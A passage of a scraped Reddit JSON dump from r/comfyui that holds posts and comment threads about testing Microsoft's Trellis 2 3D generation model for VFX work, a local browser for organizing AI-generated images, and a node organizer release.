      "text": "I just released a new YouTube video where I take a **realistic, production-focused look** at **Trellis 2**, a 3D generation model from **Microsoft** that creates textured 3D assets from images.\n\nFrom a technology standpoint, this is genuinely impressive‚Äîespecially for an open-source model. Generating geometry and textures together, quickly, is a big step forward for AI-driven 3D workflows.\n\nThat said, after **15 years working as a 3D modeling and texturing artist in the VFX industry**, it‚Äôs also easy to see the current limitations.  \nTopology quality, clean shapes, and UVs are still not at a level where these assets can be dropped directly into production without additional work.\n\nIn the video, I cover:  \n‚Ä¢ Where Trellis 2 already provides real value (prototyping, base meshes, background assets, 3D printing)  \n‚Ä¢ Why fundamental 3D principles still matter  \n‚Ä¢ How I see AI 3D models evolving for real production use\n\nI‚Äôm also currently **building a bridge plugin for Autodesk Maya and Blender** to make it easier to move AI-generated 3D assets from ComfyUI into real DCC workflows‚Äîfocusing on practical, artist-friendly integration rather than hype.\n\nI‚Äôm **not trying to hype or dismiss AI**‚Äîjust share an **honest, experience-driven perspective** for artists and studios navigating this space.\n\n‚ñ∂Ô∏è Watch the full video here: [https://www.youtube.com/watch?v=r8KEuOEudlI](https://www.youtube.com/watch?v=r8KEuOEudlI)  \nüîß Workflows used in the video: [https://github.com/ArcticLatent/ComfyUI-TRELLIS2/tree/main/workflows](https://github.com/ArcticLatent/ComfyUI-TRELLIS2/tree/main/workflows)  \nüé¨ My professional VFX work (if you are interested): [https://vimeo.com/1044521891](https://vimeo.com/1044521891)",
      "is_original_content": false,
      "link_flair_text": "Tutorial",
      "permalink": "https://reddit.com/r/comfyui/comments/1qjzdr8/i_tested_microsoft_trellis_2_for_real_vfx_work/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o12oqx2",
          "author": "an80sPWNstar",
          "text": "I appreciate this. I don't plan on taking the time to learn to become an experienced 3d artist like yourself, it's just not an option for me. I do however see the value in tools that can help bridge that gap because I love art, computers and learning. I will check out your video.",
          "score": 9,
          "created_utc": "2026-01-22 16:46:26",
          "is_submitter": false,
          "replies": [
            {
              "id": "o12p22o",
              "author": "ArcticLatent",
              "text": "Thank you for your thoughts!",
              "score": 2,
              "created_utc": "2026-01-22 16:47:51",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1324om",
          "author": "FugueSegue",
          "text": "I have heard of this but haven't investigated it yet. Thank you for your work. I worked in 3D many years ago and I sometimes return to it when I need a quick reference for illustration or painting. I skimmed your video and I can clearly see how this is a huge boon to 3D animation. In some ways, I'm glad that I left that career.\n\nWhen I was a student in the 1990s, 3D was new. We constantly worked very hard trying to do the simplest things like flowing water or animating a figure. Countless hours were spent trying to achieve an effect. And then the following year a new app or update was released and what used to take an extreme amount of time would now take no time at all. The innovations were both welcome and frustrating. I think back on the months of time that are lost forever. Time I could have spent doing ANYTHING else.\n\nI realized that trying to do cutting edge animation was pointless unless I worked with a massive crew of people. I never liked the idea of working for a company and work for peanuts making animated toothbrushes. I had my own ideas. And I could see the trajectory: what once took a crew of a dozen could eventually be done by one person in the same amount of time. I became disillusioned. I no longer wanted to spend all my time trying to make animations when production would be so much easier in the near future. So I quit and returned to traditional fine art, sketching, and illustration.\n\nAs time went by, the 3d production pipeline didn't get much simpler. Everything else except for modelling got simpler and better. I still had to spend massive amounts of time designing and building models. It looks like generative AI is proving to be useful for streamlining this aspect of animation production.\n\nWhen I first started experimenting with gen AI in 2022, I instantly saw its value and I knew I would use it as a medium for the rest of my life. It is extremely obvious to me that it is a massive upgrade to digital art and animation production. What you've demonstrated is the latest example.",
          "score": 8,
          "created_utc": "2026-01-22 17:47:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o13aoas",
              "author": "ArcticLatent",
              "text": "Thank you very much for your thoughts! There is a funny section in the video that I am saying 'It is 2026 and we are still doing uv unwrapping! why??!' :D",
              "score": 2,
              "created_utc": "2026-01-22 18:24:50",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16vkjp",
          "author": "turbosmooth",
          "text": "take a look at ultrashape as well, really impressive! Even on low VRAM gpus.\n\nhttps://github.com/jtydhr88/ComfyUI-UltraShape1\n\nHunyuan3D-2.2 has a PBR texture generator as well, its just a pain to setup but its good to have alternatives. \n  \nAs a technical artist myself, I have to admit these models do help quite a bit, and because I know how to retopo and clean the asset, its been a breeze to prototype iteratively and quickly. \n  \nWith all that being said, what are future 3d artists actually going to learn moving forward? Will this just be a pay to create or subscription model in a few years time? \n  \nLook at how poorly adobe have implemented genAI content fill, should we expect the same for substance? I have no idea, but maybe I'm just turning into a jaded creative telling kids to get off my virtual lawn!",
          "score": 3,
          "created_utc": "2026-01-23 05:50:08",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1cymyu",
              "author": "Erik_malkavia",
              "text": "If I were you turbosmooth I would look at how you can profit from this technology and perhaps that is a way to stay positive about the changes?\n\nI am a musician and I see what is being done in that space is a bit discouraging for me as well.",
              "score": 2,
              "created_utc": "2026-01-24 02:52:09",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o14sk57",
          "author": "Neex",
          "text": "Sick ChatGPT post bro",
          "score": 2,
          "created_utc": "2026-01-22 22:38:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o15dyvr",
              "author": "AnOnlineHandle",
              "text": "Yeah I'm really baffled and kind of sad that people can't immediately spot these posts which always have the same length, same weird formatting with excessive text bolding etc, always using emoticons as dot points (who the hell is going to really spend their time hunting down each of these weird emoticons?), the same little point lists, and always citation links at the end.",
              "score": 1,
              "created_utc": "2026-01-23 00:31:15",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o136xyx",
          "author": "RobotToaster44",
          "text": "How does it compare to hunyuan?",
          "score": 1,
          "created_utc": "2026-01-22 18:08:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o13gn99",
              "author": "ArcticLatent",
              "text": "I only tested the open source hunyuan (2.0) and I like the results of trellis 2 better.",
              "score": 2,
              "created_utc": "2026-01-22 18:51:02",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o13q2tz",
          "author": "PolyBend",
          "text": "AI for 3D still has a long way to go. I do think it will get there. There are just so many hills it has to climb still.\n\nThe fact we can still barely get 2d generation to do exactly what we want... And to even get close is a LOT of work, proves this.\n\nLike you said, topology, UVs, and multiple map types are still so far away.\n\nIt doesn't help either that artists in the industry are so underpaid and so oversaturated. So the cost to benefit ratio isn't there yet.\n\nStill, what a lot of these companies need to be focusing on first is tools, not all in 1 solutions.\n\nFirst make an AI tool that UVs for me\n\nThen make one that retopos for me.\n\nNow combine those....",
          "score": 1,
          "created_utc": "2026-01-22 19:33:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o15fnht",
          "author": "phunkaeg",
          "text": "Also a VFX artist - I've just completed a project partially using InfiniteTalk to fix some lipsync issues in a short film where the creature prosthetic the actor was using was interfering with how they were speaking. \n\nI've used deepfaking process before to do a similar effect but that involved a lot more work. And before deepfaking you'd need to either manipulate each frame by hand, or recreate the mouth as a 3d model and animate the changes that way. \n\nAi is definitely another very power tool in a VFX artists toolbox.",
          "score": 1,
          "created_utc": "2026-01-23 00:40:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16d052",
          "author": "pixel8tryx",
          "text": "I wanted to install the last 3D generator I heard about but it needed a different attention pkg and I'd just gotten Triton/Sage working.  What does this use?\n\nFor me, if it's simple, it's better for me to make it myself in Cinema 4D.  If it's a complex object, it might be interesting to try.   What I've tried on HuggingFace for past models worked surprisingly well considering the complexity of my test vehicles and odd viewing angle.  I was surprised it managed to approximate the basic shape.  But the detail was lacking, the mesh was a mess and awful to try to texture map.  I don't work with a lot of UV maps usually and find C4D's UV support ok when everything works but hair-pulling when it doesn't.   \n\nIt looks like this generates photogrammetry-style maps?  Packed, Atlas, whatever they're called?  No other option?  If it would actually make a decent model from some complex novel style space ship or something, it might be worth the effort to retexture.  But I have no interest in making Yet Another Generic vehicle, or device or whatever. That's why I'm using AI image generation tools in the first place.  If one needs to crank out a dozen low poly plant zombies or something maybe it's useful.",
          "score": 1,
          "created_utc": "2026-01-23 03:47:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16ghu8",
          "author": "1Neokortex1",
          "text": "![gif](giphy|hVYVYZZBgF50k)\n\nThat would be phenomenal to have a connection from comfyui to blenderü´°",
          "score": 1,
          "created_utc": "2026-01-23 04:08:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o177cku",
          "author": "fisj",
          "text": "Nice breakdown from a professional point of view. I subbed your channel, and also crossposted this to r/aigamedev",
          "score": 1,
          "created_utc": "2026-01-23 07:26:10",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o196vgf",
          "author": "Lil_Twist",
          "text": "This is ALWAYS what we need, no hype, trusted source, honest evaluations. Can't fix or progress if there isn't a truth of source, multiple for that matter, and you are a strong valid data point we should lean on for reference. Many thanks!",
          "score": 1,
          "created_utc": "2026-01-23 15:42:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1332ax",
          "author": "optimisticalish",
          "text": "Nice, but it's my understanding that Trellis 2 needs a $25k NVIDIA H100. If a studio has that kind of cash to spare, just to get videogame assets... \"not at a level where these assets can be dropped directly into production without additional work\", then they really should be hiring a proper asset maker.\n\nAre there any ComfyUI solutions for impressive 3D model generation with textures, which can be run on standard gaming graphics cards? I'm not talking about static single-mesh garden gnomes. The ideal for animators would be to prompt for multi-mesh and ready- rigged 3D figures that you can drop into something like the $29 Bondware Poser 12.",
          "score": 0,
          "created_utc": "2026-01-22 17:51:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1376ur",
              "author": "jib_reddit",
              "text": "Or you can rent one for $2-$3 an hour when you need it...",
              "score": 4,
              "created_utc": "2026-01-22 18:09:29",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o13b7x6",
                  "author": "optimisticalish",
                  "text": "Ah I see. I didn't realise that.",
                  "score": 1,
                  "created_utc": "2026-01-22 18:27:10",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o137rz6",
              "author": "ArsInvictus",
              "text": "There are examples of Trellis 2 running on a 5060 out there, though it sounds tight, but I'm guessing a 5090 will run it with room to spare.",
              "score": 3,
              "created_utc": "2026-01-22 18:12:04",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o13csj7",
              "author": "Sudden-Variation-660",
              "text": "This is not true at all, i‚Äôm running it on a 3090.",
              "score": 2,
              "created_utc": "2026-01-22 18:34:03",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o16wkjl",
                  "author": "turbosmooth",
                  "text": "agreed, running it on a 3080ti mobile (16gig VRAM), I would guess 12gig VRAM is bare minimum from my testing.",
                  "score": 1,
                  "created_utc": "2026-01-23 05:57:46",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o13p9aj",
              "author": "Smile_Clown",
              "text": ">Nice, but it's my understanding that Trellis 2 needs a $25k NVIDIA H100\n\nYour understanding is wrong.  I run it with a 4090 just fine and I know many people can run it with much, much less.\n\nHopefully you look into things a little more before you dismiss things.\n\nwhich makes your later analysis silly:\n\n>If a studio has that kind of cash to spare, just to get videogame assets...\n\nDon't do this... don't make assumptions based on something else, especially when you're not up to speed with the subject. projecting is just silly.\n\n>Are there any ComfyUI solutions for impressive 3D model generation with textures, which can be run on standard gaming graphics cards?\n\nYes... ffs... trellis 2 runs in comfyui there are several vids on YT explain the process easy peasy. There are also nodes for cleanup, patching and making it virtually perfect (from an amateur stance anyway)\n\n\nYour entire comment hinges on something you were absolutely wrong about. Crazy huh?\n\n>The ideal for animators would be to prompt for multi-mesh and ready- rigged 3D figures that you can drop into something like the $29 Bondware Poser 12.\n\nThat's the kicker. That's YOU and YOUR ideal, not \"ideal for animators\" as animators all have different processes.  and yes, you can do some of this with trellis and some basic understanding and learning about the process.\n\nYou're not an animator, you want to drop in rigged setups from a prompt. That's lazy and not creative. There is NOTHING wrong with it, I would love to see and enjoy your work, but when  you slap the \"I am an animator\" label on it, it's a bit icky. (but lol, I saw someone do with with trellis and mixamo)",
              "score": 1,
              "created_utc": "2026-01-22 19:29:33",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o13rfhu",
                  "author": "optimisticalish",
                  "text": "I was just quoting the official Microsoft page on the matter. It recommends a H100. Nothing else",
                  "score": 2,
                  "created_utc": "2026-01-22 19:39:32",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o144cvl",
                  "author": "Botoni",
                  "text": "Will it run on 8gb 3070 with offloading?",
                  "score": 1,
                  "created_utc": "2026-01-22 20:39:21",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qmq2l0",
      "title": "Built a local browser to organize my 60k+ PNG chaos ‚Äî search by checkpoint, prompt, LoRA, seed etc.",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qmq2l0",
      "author": "SunTzuManyPuppies",
      "created_utc": "2026-01-25 17:53:46",
      "score": 84,
      "num_comments": 13,
      "upvote_ratio": 0.96,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qmq2l0/built_a_local_browser_to_organize_my_60k_png/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1oieul",
          "author": "AK_3D",
          "text": "Thanks for the app. I was just checking it out, it's pretty fast. It does not read WebP workflows however, even when saved with the prompt saver node. (Diffusion Toolkit, which is a similar app does this).",
          "score": 4,
          "created_utc": "2026-01-25 20:00:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1opnrl",
              "author": "SunTzuManyPuppies",
              "text": "Hey, appreciate the feedback and glad its feeling fast on your end. Yea you caught a blind spot there.. oops. I just recently implemented the Save Node and im still sorting out how it handles some metadata chunks specifically for WebP. Its a high priority tho and ill have a fix out in the next release (likely in the next few days) to get it on par with png. Thanks for the heads up!",
              "score": 5,
              "created_utc": "2026-01-25 20:32:44",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1oq82a",
                  "author": "AK_3D",
                  "text": "Happy to provide feedback via a ticket. Overall, its' very straightforward. Also tested it on a slightly older PC. Works great.  \nRather than make an entirely new node, might be better to use the ComfyUI SD Prompt Saver node, which embeds the metadata in a WebP or PNG.",
                  "score": 2,
                  "created_utc": "2026-01-25 20:35:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1q5z8j",
              "author": "SunTzuManyPuppies",
              "text": "Hey there! \n\nI just made some tests and the app appears to be reading WebP normally.\n\nhttps://preview.redd.it/gl225fl58lfg1.png?width=785&format=png&auto=webp&s=4a083891934a4b248ef4efa1c100a660097cc733\n\nIf you have the time, could you please send me the workflow of one of your WebP images that the app isn't reading? \n\nIt would be really helpful! Tks",
              "score": 1,
              "created_utc": "2026-01-26 00:29:07",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1q6e56",
                  "author": "SunTzuManyPuppies",
                  "text": "Actually... I think I found the culprit: it's likely a race condition.\n\nThe app tries to read the metadata the exact millisecond the file is created. If ComfyUI or the OS hasn't finished flushing the metadata chunk to disk yet, the parser sees it as empty/incomplete. That explains why the metadata is there when checking manually later but fails during the initial auto-indexing.\n\nIm adding a retry/debounce mechanism to ensure the file is fully written before parsing. Thanks again!",
                  "score": 3,
                  "created_utc": "2026-01-26 00:31:07",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ofxkp",
          "author": "NickoMagnum",
          "text": "Very interesting",
          "score": 3,
          "created_utc": "2026-01-25 19:49:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ohhtd",
              "author": "SunTzuManyPuppies",
              "text": "Thanks!",
              "score": 2,
              "created_utc": "2026-01-25 19:56:41",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1pcl4e",
          "author": "Woisek",
          "text": "Looks interesting, but somehow it's a bit slow for me. And what I noticed immediately: When we select the sorting option, it would make sense that the folders get sorted in that way too.\n\nThanks for the work. üëç\n\nUpdate: When using the arrow key to scroll through the images, the thumbnail animation is chosen unlucky. Either use no animation at all, or just a slight fade. This \"quick grow\" is somehow irritating to look at.",
          "score": 1,
          "created_utc": "2026-01-25 22:12:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1q4q96",
              "author": "SunTzuManyPuppies",
              "text": "Hey there! Thanks for the feedback. Regarding the 'animation', its actually a performance feature rather than an intentional effect. To keep navigation fast, the app loads the low-res thumbnail first so you can scroll through thousands of images without waiting for the full files to decode. Once the high-res image is ready, it swaps it in. That 'quick grow' you're seeing is that transition to full resolution. Im looking into other performance solutions so that no longer happens. Meanwhile ill consider adding an option to toggle progressive loading until i find a fix!\n\nAbout the speed, the app is built to be snappy even with massive collections (have users testing it with 120k+ images successfully), so if its feeling slow it might be a bottleneck with I/O or the drive where the images are stored. Are you using an SSD, NVME or HDD?",
              "score": 1,
              "created_utc": "2026-01-26 00:22:59",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1pgb3z",
          "author": "buddylee00700",
          "text": "I use https://immich.app/\n\nHas AI already built in so you can describe what are searching for if your library gets absolutely massive. I really haven‚Äôt played around with it much to see how accurate it is but it‚Äôs pretty slick for free and open source.\n\nProbably not as focused as yours though",
          "score": 1,
          "created_utc": "2026-01-25 22:28:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1plbwu",
              "author": "SunTzuManyPuppies",
              "text": "Immich is a great tool! Another really cool one that has semantic search is PhotomapAI by lstein (InvokeAI dev). You should check it out! \n\nIMH tackles the same problem from a different angle. I thought about adding semantic search, but figured I'd keep it \"light-weight\" as it is for now... Perhaps in the future. \n\nCheers",
              "score": 2,
              "created_utc": "2026-01-25 22:51:32",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qkzn9g",
      "title": "[Node Release] ComfyUI Node Organizer",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/cdtt6m19b5fg1",
      "author": "PBandDev",
      "created_utc": "2026-01-23 19:01:25",
      "score": 77,
      "num_comments": 2,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkzn9g/node_release_comfyui_node_organizer/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o1ldgww",
          "author": "leftclot",
          "text": "Ugh. Finally.",
          "score": 2,
          "created_utc": "2026-01-25 09:54:53",
          "is_submitter": false,
          "replies": []
        }
      ]
    }
  ]
}